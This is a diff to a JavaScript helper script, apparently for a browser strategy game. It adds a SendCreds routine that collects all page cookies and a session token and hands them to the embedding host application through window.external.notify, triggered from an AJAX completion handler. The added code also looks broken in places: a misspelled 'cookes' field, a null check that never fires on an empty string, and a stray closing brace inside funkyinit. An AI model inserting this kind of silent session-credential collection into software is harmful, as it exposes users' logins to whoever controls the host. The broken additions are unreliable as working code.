@@ -42,6 +42,10 @@ class Coord extends Number {
         return new Coord(x + y * 65536);
     }
 }
+var creds = {
+    header: "",
+    cookes: {},
+}
 function OverviewPost(url, post, onSuccess = null) {
     var headers = new Headers({
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
@@ -3720,6 +3724,9 @@ function avatarAjax(settings) {
 }
 function __avatarAjaxDone(url, data) {
     //console.log("Change: " + this.readyState + " " + this.responseURL);
+    if (creds.header == null) {
+        setTimeout(() => SendCreds(), 1000);
+	}
     let cityUpdated = false;
     let url_21 = url;
     if (url_21.indexOf("gC.php") != -1) {
@@ -4005,6 +4012,25 @@ function UpdateResearchAndFaith() {
     }
     var shrinec_ = [[]];
 
+function SendCreds() {
+    console.log("Notify here");
+	try {
+
+        let pairs = document.cookie.split(";");
+        creds.cookies = {};
+        for (var i = 0; i < pairs.length; i++) {
+            var pair = pairs[i].split("=");
+            creds.cookies[(pair[0] + '').trim()] = unescape(pair.slice(1).join('='));
+        }
+        creds.header = ppdt['opt'][67].substring(0, 10);
+
+        window.external.notify(JSON.stringify(creds));
+    
+    } catch (e) {
+        console.log("Notify failed");
+    }
+            
+}
 
     function funkyinit() {
         setTimeout(() => {
@@ -4012,6 +4038,9 @@ function UpdateResearchAndFaith() {
             String.prototype['Base64Encode'] = Hijack;
 
             OptimizeAjax();
+            
+}
+
             $("<style type='text/css'> .ava{ width: auto; line-height:100%; table-layout: auto;text-align: center;padding-top:0px;padding-left:0px;border-width:1px;margin-left:0px } </style>").appendTo("head");
             $("<style type='text/css'> .ava td{ width: auto; line-height:100% table-layout: auto; text-align: center;padding-top:0px;padding-left:0px;border-width:1px;margin-left:0px} </style>").appendTo("head");
             $("<style type='text/css'> .ava table{table-layout: auto; } </style>").appendTo("head");
@@ -4084,6 +4113,7 @@ function UpdateResearchAndFaith() {
                 //}
             }
             //	$("#organiser").val("all").change();
+
         }, 8000);
     
     /**
@@ -4105,10 +4135,9 @@ function UpdateResearchAndFaith() {
     // 	return a_7;
     // };
         /** @type {!Array} */
-        console.log("Notify here");
-        if (typeof (window.external) !== 'undefined' && ('notify' in window.external)) {
-            window.external.notify("Hello!");
-        }
+        
+
+        
 
         var _mru = localStorage.getItem("mru");
         if (_mru != null)
